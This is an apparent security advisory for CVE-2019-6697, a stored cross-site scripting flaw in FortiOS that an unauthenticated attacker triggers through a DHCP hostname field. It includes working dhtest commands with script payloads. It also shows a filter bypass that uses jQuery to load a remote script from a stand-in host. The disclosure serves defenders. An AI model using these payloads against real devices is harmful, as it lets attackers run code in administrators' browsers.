# SSD Advisory - Fortigate DHCP Stored XSS

**Vulnerability Summary**  
The following advisory describes a Stored XSS Vulnerability found in Fortinet's Fortigate Firewall(FortiOS) via an unauthenticated DHCP packet.

**CVE**  
CVE-2019-6697

**Credit**  
An independent Security Researcher, Toshitsugu Yoneyama, has reported this vulnerability to SSD Secure Disclosure program.

**Affected systems**  
FortiOS v6.0.4 build 0231.

**Vendor Response**  
Fortigate has fixed the vulnerability in FortiOS version 6.2.2

**Vulnerability Details**  
An unauthenticated attacker can trigger a Stored XSS Vulnerability via a malicious DHCP packet in the Fortigate DHCP Monitor. This can happen if Device Detection is enabled through Network >Interface > Edit Interface > Device Detection

![](https://ssd-disclosure.com/wp-content/uploads/2019/07/fortigate_device_detection.png)  
When this option is enabled the attacker may perform the following steps in order to exploit the vulnerability:

1.  Install dhtest or any other tool that can send arbitrary DHCP packets.  
    (https://sargandh.wordpress.com/2012/02/23/linux-dhcp-client-simulation-tool/)
2.  Send a malicious DHCP packet. For example:

```
#./dhtest-master/dhtest -i eth0 -m 12:34:56:78:90:12 -h "x<svg onload=alert();)>x"
    [Option]
    -m : mac address
    -h : hostname(dhcp option 12). The attacker can inject malicious scripts.
```

3.  Once the victim logs into Fortigate's dashboard and goes to the "DHCP Monitor"  
    (https://<ip>/ng/dhcp/monitor) the browser will execute the malicious script injected by the attacker.

    ![](https://ssd-disclosure.com/wp-content/uploads/2019/07/fortigate_alert_popup.png)

But there are a few limitations:  
The user's input is validated, not allowing us to use tags like `<script src>`, `<img src=_onerror=>` and other similar options. There are also character count limits:

* DHCP option 12 has a string size limit allowing only up to 256 characters. More information about this option is available in the RFC.
* Fortigate's string size can't be longer than 128 characters.

However, Fortigate uses jQuery which allows the attacker to bypass the mentioned restrictions and execute arbitrary scripts using the following method:

```
#./dhtest-master/dhtest -i eth0 -m 12:34:56:78:90:12 -h "x<svg onmouseover=$.getScript('//www.example.jp/a.js')>x"
```